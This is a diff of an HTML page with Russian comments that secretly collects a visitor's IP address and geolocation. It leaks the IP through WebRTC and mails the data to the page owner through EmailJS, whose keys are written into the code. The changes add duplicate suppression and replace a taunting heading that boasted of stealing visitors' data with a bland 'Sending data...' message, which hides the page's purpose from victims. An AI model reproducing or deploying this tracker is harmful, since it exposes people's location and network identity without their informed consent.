@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send IP and Location</title>
+    <title>Send IP and Location with Anti-Spam</title>
 
-    <!-- Загрузка актуальной версии EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
             emailjs.init("nRcxesuNKhp7AMc4d");  // Ваш публичный User ID
         })();
-        
+
+        // Получение IP-адреса
         function getUserIP(onNewIP) {
             var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
             var pc = new myPeerConnection({
@@ -42,41 +42,64 @@
             };
         }
 
+        // Отправка данных на почту
         function sendData(userData) {
             emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                 .then(function(response) {
                     console.log("Email sent successfully", response);
                     alert('Данные отправлены на вашу почту!');
+                    if (userData.location) {
+                        markIpAsSent(userData.ip); // Помечаем IP как отправленный с геолокацией
+                    }
                 }, function(error) {
                     console.error("Failed to send email", error);
                     alert("Ошибка при отправке данных: " + error.text);
                 });
         }
 
+        // Проверка, отправлялись ли данные с этого IP
+        function isIpAlreadySent(ip) {
+            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
+            return sentIps[ip] && sentIps[ip].locationSent;
+        }
+
+        // Пометка IP как отправленного с геолокацией
+        function markIpAsSent(ip) {
+            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
+            sentIps[ip] = { locationSent: true };
+            localStorage.setItem('sentIps', JSON.stringify(sentIps));
+        }
+
+        // Основная функция для получения данных пользователя
         function getUserData() {
-            let userData = {};
-
             getUserIP(function(ip) {
-                userData.ip = ip;
-                console.log("IP:", ip);  // Выводим IP в консоль для проверки
-            });
+                console.log("Получен IP:", ip);  
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    userData.location = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
-                    };
-                    console.log("Location:", userData.location);  // Выводим геолокацию в консоль для проверки
-                    sendData(userData);  // Отправляем данные
-                }, function(error) {
-                    alert('Ошибка при получении геолокации: ' + error.message);
-                    sendData(userData);  // Отправляем данные без геолокации
-                });
-            } else {
-                alert("Геолокация не поддерживается этим браузером.");
-                sendData(userData);  // Отправляем данные без геолокации
-            }
+                // Проверяем, был ли этот IP уже отправлен с геолокацией
+                if (isIpAlreadySent(ip)) {
+                    console.log("Этот IP уже отправлял данные с геолокацией. Отправка отменена.");
+                    return;
+                }
+
+                let userData = { ip: ip };
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        userData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        console.log("Геолокация получена:", userData.location);
+                        sendData(userData);
+                    }, function(error) {
+                        alert('Ошибка при получении геолокации: ' + error.message);
+                        sendData(userData);  // Отправка данных только с IP
+                    });
+                } else {
+                    alert("Геолокация не поддерживается этим браузером.");
+                    sendData(userData);  // Отправка данных только с IP
+                }
+            });
         }
 
         window.onload = function() {
@@ -85,6 +108,6 @@
     </script>
 </head>
 <body>
-    <h1>У меня теперь есть все твои данные: от почты аккаунта с которого ты заходишь до ip и местоположения если одобрил :)</h1>
+    <h1>Отправка данных...</h1>
 </body>
 </html>
